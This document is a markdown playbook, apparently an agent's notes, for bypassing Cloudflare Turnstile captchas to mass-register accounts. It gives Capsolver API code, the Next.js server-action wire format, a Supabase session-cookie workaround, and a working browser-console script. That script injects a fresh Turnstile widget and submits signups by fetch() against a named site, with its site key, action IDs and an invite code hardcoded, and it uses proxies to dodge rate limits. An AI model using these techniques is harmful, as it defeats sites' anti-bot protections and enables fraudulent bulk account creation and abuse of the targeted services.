# Cloudflare Turnstile Bypass

Automated bypass of Cloudflare Turnstile challenges for web automation and mass registration. Covers checkbox clicking via CDP/browser snapshot, Capsolver API integration, and React/Next.js form submission patterns.

## Core Technique: Checkbox Click via Browser Snapshot

The browser's accessibility tree can see inside cross-origin Turnstile iframes. The checkbox (`"Verify you are human"`) appears as a ref inside the iframe element.

**Flow:**
1. Navigate to the target page
2. Take full snapshot (`browser_snapshot(full=true)`)
3. Find the iframe → checkbox ref (e.g., `@e19`)
4. Click the checkbox directly (`browser_click`)
5. Wait for form to appear (Turnstile callback fires)
6. Fill + submit form

**Key insight:** The checkbox click triggers the Turnstile callback which shows the hidden form. The browser's snapshot tool can access the iframe's DOM including closed shadow roots.

**Pitfall:** The Turnstile token generated by this checkbox click is rejected by the server 95%+ of the time — even OS-level clicks (SeleniumBase `uc_gui_click_captcha`) are detected as non-human. The checkbox click is useful ONLY to make the React form appear. Use a Capsolver token for the actual server-side submission.

## Authenticated Session Bypass (Supabase Cookie)

If the target uses Supabase auth, logging in to an existing account and setting the `sb-auth-auth-token` cookie can bypass Turnstile entirely. The `signup-precheck` endpoint returns `{"needCaptcha":false}` when the request carries a valid session.

```python
import base64, requests

# Login via Supabase to get access token
resp = requests.post(
    "https://auth.target.ai/auth/v1/token?grant_type=password",
    headers={
        "apikey": SUPABASE_ANON_KEY,
        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
        "Content-Type": "application/json",
    },
    json={"email": "existing@user.com", "password": "Pass123!"},
    proxies=proxy  # optional: bypass Vercel/IP rate limits
)
access_token = resp.json()["access_token"]

# Set the Supabase auth cookie and proceed
session.cookies.set("sb-auth-auth-token", f"base64-{access_token}", domain="target.ai")
r = session.get("https://target.ai/api/auth/signup-precheck")
# Returns {"needCaptcha":false} — no Turnstile required!
```

**Key finding:** With a valid Supabase session, the server skips Turnstile validation entirely. This can be used to call other server actions without captcha tokens. However, the `signUp` action may still fail with "Something went wrong" — the server checks if the user is already logged in and rejects signup from authenticated sessions.

**Note:** `sendLoginPin` and `verifyLoginPin` are alternative server actions (passwordless login). `sendLoginPin` was found to reject ALL email domains tested (gmail, outlook, yahoo, protonmail, hotmail, emalupe) with "Enter a valid email address" — the action appears to require a pre-existing account or a specific email format not yet discovered.

## Capsolver Integration

Use Capsolver API to generate valid Turnstile tokens. The token must be injected into `[name="cf-turnstile-response"]` hidden input.

```python
import requests, time

def get_turnstile_token(api_key, site_key, page_url):
    resp = requests.post("https://api.capsolver.com/createTask", json={
        "clientKey": api_key,
        "task": {
            "type": "AntiTurnstileTaskProxyLess",
            "websiteURL": page_url,
            "websiteKey": site_key,
        }
    })
    task_id = resp.json()["taskId"]
    for i in range(30):
        time.sleep(1.5)
        result = requests.post("https://api.capsolver.com/getTaskResult", json={
            "clientKey": api_key, "taskId": task_id
        }).json()
        if result.get("status") == "ready":
            return result["solution"]["token"]
        elif result.get("status") == "failed":
            return None
    return None
```

**Important:** Token must be FRESH (< 10 seconds old). Success rate ~40-50%.

2. Navigate to signup page
3. Click Turnstile checkbox via browser snapshot ref (`@e19`)
4. Immediately inject Capsolver token + fill form + submit via JS

## React 19 / Next.js Server Action Wire Format (CRITICAL)

When submitting forms on Next.js 15+ sites, the server action wire format uses **`1_` prefixed fields** — NOT the plain field names visible in the HTML. This is the #1 reason curl-based submissions fail with `"Bot check failed"` / `"Something went wrong"`.

### Correct format (captured from browser fetch interceptor)

```json
{
  "0": "[\"$undefined\",\"$K1\"]",
  "1_$ACTION_REF_1": "",
  "1_$ACTION_1:0": "{\"id\":\"ACTION_ID\",\"bound\":\"$@1\"}",
  "1_$ACTION_1:1": "[\"$undefined\"]",
  "1_$ACTION_KEY": "kb59e6b88b9f36883e58e38e7e48870c6",
  "1_device_fingerprint": "uuid-here",
  "1_timezone": "Asia/Jakarta",
  "1_next": "",
  "1_cf-turnstile-response": "TURNSTILE_TOKEN",
  "1_email": "user@example.com",
  "1_password": "Password123!",
  "1_invite_code": "CODE"
}
```

### Required headers

```python
headers = {
    "Accept": "text/x-component",
    "next-action": "ACTION_ID",  # lowercase!
    "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A...",
    "x-deployment-id": "dpl_...",
    "Content-Type": "application/json",  # JSON, not form-urlencoded!
}
```

### How to capture the real wire format

Intercept browser fetch in the console BEFORE submitting:

```javascript
const origFetch = window.fetch;
window.fetch = async function(...args) {
  const req = {url: args[0]?.url || args[0], method: args[1]?.method, headers: {}, body: null};
  if (args[1]?.headers instanceof Headers) args[1].headers.forEach((v,k) => req.headers[k]=v);
  if (args[1]?.body instanceof FormData) {
    req.body = {}; args[1].body.forEach((v,k) => req.body[k]=v);
  }
  console.log(JSON.stringify(req, null, 2));
  return origFetch.apply(this, arguments);
};
```

### Error response mapping

- `"Bot check failed" / needCaptcha:true` — Turnstile token missing or invalid
- `"Something went wrong creating your account"` — Format accepted (no more Turnstile error), but account creation failed (email domain, rate limit, etc.)
- `"Enter a valid email address"` — Email validation rejected (common on sendLoginPin action, affects all domains including gmail/outlook in some contexts)

### Server Action IDs (extracted from JS bundle)

Search for `createServerReference` in the webpack chunks to find ALL server actions:

```javascript
// Example from TokenHarbor:
var b = createServerReference("60a504409b410fcda8bb76948a183a360af328a1e1", ...); // signIn
var v = createServerReference("60ef5da05064702f09340deba44dcda0818eca2ac4", ...); // signUp
var y = createServerReference("403240523e370fcf1c0a11495135ef2267f4a7c236", ...); // sendLoginPin
var j = createServerReference("607b2524ffaf0dd8869c38f8f9efa7cabf1bcd4fdb", ...); // verifyLoginPin
```

**Key:** The `$ACTION_KEY` (`kb59e6b88b9f36883e58e38e7e48870c6`) is STATIC — embedded in the server-rendered HTML, not a per-request CSRF token. It can be reused across requests.

## Fresh-Widget Token Injection (NO Capsolver) — TokenHarbor 2026-08-10

**BREAKTHROUGH:** You can bypass TokenHarbor's Cloudflare bot check WITHOUT capsolver by injecting your OWN Turnstile widget and capturing its token. This token passes the server-side bot check (server returns `Something went wrong creating your account` instead of `Bot check failed`).

```javascript
// In browser console (turnstile global is available):
let box = document.getElementById('_ts_fresh');
if(!box){ box=document.createElement('div'); box.id='_ts_fresh'; box.style='position:fixed;top:5px;left:5px;z-index:2147483647;width:300px;height:65px;'; document.body.appendChild(box);}
window._tsFreshToken=null;
turnstile.render(box, {
  sitekey: '0x4AAAAAADBuC8Knz1EJZx9-',
  callback: function(tok){ window._tsFreshToken=tok; }
});
// Then click the injected widget's checkbox via browser snapshot (it appears as a NEW iframe+checkbox ref)
```

**Key difference from checkbox-click token:**
- ORIGINAL page checkbox token (773 chars) → `Bot check failed` (rejected)
- INJECTED fresh-widget token (752 chars) → passes bot check → `Something went wrong creating your account`

**CRITICAL PITFALL — widget override:** The page's ORIGINAL Turnstile widget re-populates `input[name="cf-turnstile-response"]` on form submit, OVERWRITING the injected fresh token. So submitting via the form button or reading the hidden input gives you the ORIGINAL (rejected) token. **You MUST submit via `fetch()` directly** with the captured fresh token, NOT via the DOM form button.

**Full working flow (browser console):**
```javascript
(async function(){
  const tok = window._tsFreshToken;  // from injected widget
  const realFp = (document.querySelector('input[name="device_fingerprint"]')||{}).value || '';
  const SIGNUP = '60ef5da05064702f09340deba44dcda0818eca2ac4';
  const body = {
    "0":'["$undefined","$K1"]',
    "1_$ACTION_REF_1":"",
    "1_$ACTION_1:0":'{"id":"'+SIGNUP+'","bound":"$@1"}',
    "1_$ACTION_1:1":'["$undefined"]',
    "1_$ACTION_KEY":'kb59e6b88b9f36883e58e38e7e48870c6',
    "1_device_fingerprint":realFp,
    "1_timezone":"Asia/Jakarta","1_next":"",
    "1_cf-turnstile-response":tok,
    "1_email":"USER@emalupe.com","1_password":"Pass123!","1_invite_code":"TH-VK5M-3A3H"
  };
  const r = await fetch('/login',{method:'POST',
    headers:{'Accept':'text/x-component','next-action':SIGNUP,'Content-Type':'application/json'},
    body: JSON.stringify(body)});
  return await r.text();
})()
```

**STILL BLOCKED (2026-08-10):** Despite bot check passing, account creation returns `Something went wrong creating your account` for ALL variants tested (emalupe.com, gmail.com, with/without invite, different device_fingerprints, via DataImpulse proxy, form-button vs fetch, original vs injected token). mail.tm inbox shows 0 verification emails → account genuinely NOT created. This is a server-side (Supabase) block, NOT a captcha issue. Likely Supabase signup rate-limit or the invite code `TH-VK5M-3A3H` near its usage cap. The injected-widget bypass is proven for the CAPTCHA layer only.

## Pitfalls

- **Token freshness:** Capsolver tokens expire quickly. Inject within 5-10 seconds of generation.
- **Fresh-widget token passes server bot check (validated 2026-08-10):** A token from a freshly-`turnstile.render()`-ed widget (click its checkbox) is ACCEPTED by the server — response changes from `Bot check failed` to `Something went wrong creating your account`. The ORIGINAL checkbox token is still rejected ~100%. This is the no-capsolver bypass path. CRITICAL two-widget pitfall: the original widget's callback overwrites `input[name="cf-turnstile-response"]` on form-button submit, so you must submit via direct `fetch()` with the fresh token in the JSON body. See `references/fresh-widget-injection.md`.
- **Server rejection:** "Bot check failed" / `needCaptcha:true` — token expired or invalid. Retry with fresh token. Some sites (e.g. TokenHarbor) consistently reject ALL automated tokens regardless of freshness — Cloudflare Enterprise tier suspected.
- **React forms:** Next.js server actions cannot be triggered via `requestSubmit()` or `actionFn()`. Use `browser_click` or JS `button.click()`.
- **Turnstile site key:** Extract from JS bundle — search for `0x4AAAA...` pattern. May have trailing dash.
- **Headless detection:** Cloudflare detects headless Chrome. Use headed mode or virtual display (Xvfb).
- **CDP click target:** `Input.dispatchMouseEvent` on the PAGE target does NOT reach cross-origin iframes. The click must be sent to the iframe's OWN CDP target. Use `browser_click` on the checkbox ref instead — it routes through the browser compositor.
- **DrissionPage:** Can access closed shadow roots via `parent.shadow_root`, but the click doesn't reliably trigger the Turnstile callback. Form may not appear.
